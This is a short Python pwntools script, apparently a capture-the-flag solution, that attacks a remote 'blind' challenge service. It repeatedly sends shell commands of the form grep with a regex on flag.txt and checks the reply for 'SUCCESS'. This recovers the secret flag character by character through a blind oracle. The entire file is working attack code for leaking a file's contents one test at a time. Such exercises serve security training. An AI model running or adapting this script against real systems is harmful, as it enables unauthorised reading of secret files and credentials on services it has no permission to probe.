#!/usr/bin/env python3

from pwn import *
import time

LOCAL = 0
literal = "[{}]"
flag = "^ictf{"


def get_new_process():
    if LOCAL:
        return process(["python3", "blind.py"])
    else:
        return remote("oreos.ctfchallenge.ga", 12345)

def testChar(p, s):
    cmd = "grep \""+flag+s+"\" flag.txt"
    # print(cmd)
    p.sendline(cmd.encode())
    # time.sleep(.15)
    ret = p.recvline()
    # print(ret)
    return b"SUCCESS" in ret


if __name__ == '__main__':
    p = get_new_process()
    # print(p.recv())
    recent = ''
    while '}' not in flag:
        found = 0
        for c in range(32, 127):
            ch = literal.format(chr(c))
            if chr(c) == '[' or chr(c)==']':
                ch = chr(c)
            if testChar(p, ch):
                flag += chr(c)
                print(flag)
                found = 1
                break
        if not found:
            print("could not find character")
            print(flag)
            exit()
    print(flag)